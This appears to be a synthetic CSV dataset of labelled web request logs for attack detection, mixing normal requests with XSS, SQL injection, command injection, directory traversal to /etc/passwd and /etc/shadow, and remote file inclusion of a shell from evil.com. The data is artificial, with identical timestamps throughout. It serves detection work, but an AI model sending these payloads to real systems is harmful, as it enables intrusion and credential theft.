timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,192.168.0.18,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.124,GET,/index.html,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.107,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.151,GET,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.234,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.130,GET,/search?q=1' UNION SELECT null--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.117,POST,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.33,POST,/index.html,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.28,GET,/css/style.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.30,POST,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.71,POST,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.158,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.217,POST,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.41,GET,/ping?ip=127.0.0.1;ls,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.50,POST,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.170,GET,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.138,POST,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.102,GET,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.34,POST,/search?q=<script>alert('x')</script>,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.108,POST,/favicon.ico,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.242,POST,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.32,GET,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.147,GET,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.137,GET,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.190,GET,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.203,GET,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.27,POST,/css/style.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.66,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.30,POST,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.201,GET,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.67,GET,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.21,POST,/login?user=admin'--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.76,POST,/download?file=../../../../etc/passwd,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.45,POST,/search?q=1' UNION SELECT null--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.143,GET,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.118,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.126,GET,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.187,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.222,POST,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.41,GET,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.98,GET,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.254,GET,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.121,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.253,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.106,POST,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.97,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.222,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.178,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.50,POST,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.90,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.37,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.254,GET,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.207,GET,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.178,GET,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.174,POST,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.133,GET,/ping?ip=127.0.0.1;ls,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.111,POST,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.103,POST,/img/logo.png,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.210,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.98,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.118,GET,/about,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.127,POST,/search?q=1' UNION SELECT null--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.111,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.94,GET,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.124,POST,/profile,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.78,GET,/favicon.ico,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.54,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.48,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.171,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.163,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.47,POST,/contact,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.60,GET,/search?q=<script>alert('x')</script>,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.186,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.162,POST,/favicon.ico,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.32,GET,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.119,GET,/contact,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.27,POST,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.81,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.61,GET,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.20,GET,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.11,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.119,GET,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.253,POST,/vendor/bootstrap.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.48,GET,/download?file=../../../../etc/passwd,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.161,GET,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.95,GET,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.241,GET,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.130,POST,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.172,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.32,GET,/product?id=10 OR 1=1,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.230,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.176,GET,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.48,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.143,GET,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.131,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.125,POST,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.74,GET,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.68,POST,/favicon.ico,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.91,POST,/search?q=1' UNION SELECT null--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.41,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.144,POST,/about,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.200,GET,/favicon.ico,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.98,GET,/view?include=../../../../etc/passwd,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.230,GET,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.47,POST,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.153,GET,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.10,GET,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.99,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.208,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.70,GET,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.41,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.198,GET,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.200,GET,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.133,POST,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.114,POST,/contact,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.232,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.13,POST,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.84,GET,/search?q=1' UNION SELECT null--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.130,POST,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.174,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.176,POST,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.61,POST,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.121,GET,/login?user=admin'--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.164,POST,/search?q=1' UNION SELECT null--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.232,GET,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.104,GET,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.198,GET,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.212,POST,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.252,POST,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.201,POST,/dashboard,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.198,GET,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.122,GET,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.39,GET,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.209,POST,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.165,GET,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.221,POST,/dashboard,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.218,GET,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.168,POST,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.97,GET,/profile,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.41,GET,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.77,GET,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.205,GET,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.232,GET,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.58,POST,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.244,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.14,POST,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.219,GET,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.15,GET,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.235,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.70,POST,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.120,POST,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.189,GET,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.22,POST,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.114,POST,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.97,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.202,POST,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.185,GET,/dashboard,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.150,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.94,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.208,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.43,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.232,POST,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.143,GET,/product?id=10 OR 1=1,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.81,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.48,POST,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.169,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.104,GET,/search?q=<script>alert('x')</script>,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.2,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.57,POST,/product?id=10 OR 1=1,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.62,GET,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.223,POST,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.13,GET,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.168,POST,/contact,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.162,GET,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.124,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.35,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.176,POST,/favicon.ico,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.190,GET,/search?q=1' UNION SELECT null--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.70,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.195,POST,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.147,GET,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.104,POST,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.88,GET,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.131,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.66,POST,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.18,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.77,POST,/about,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.77,GET,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.192,POST,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.83,POST,/index.html,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.230,POST,/img/logo.png,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.22,GET,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.21,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.13,POST,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.74,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.60,GET,/about,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.68,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.67,POST,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.225,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.202,GET,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.136,GET,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.162,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.211,POST,/search?q=1' UNION SELECT null--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.253,GET,/search?q=<script>alert('x')</script>,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.120,POST,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.239,POST,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.113,POST,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.183,GET,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.65,GET,/,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.91,GET,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.226,GET,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.60,POST,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.71,GET,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.142,POST,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.122,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.224,POST,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.50,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.128,GET,/contact,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.66,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.139,GET,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.217,GET,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.171,GET,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.168,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.201,POST,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.18,POST,/vendor/bootstrap.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.131,GET,/ping?ip=127.0.0.1;ls,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.59,POST,/dashboard,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.103,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
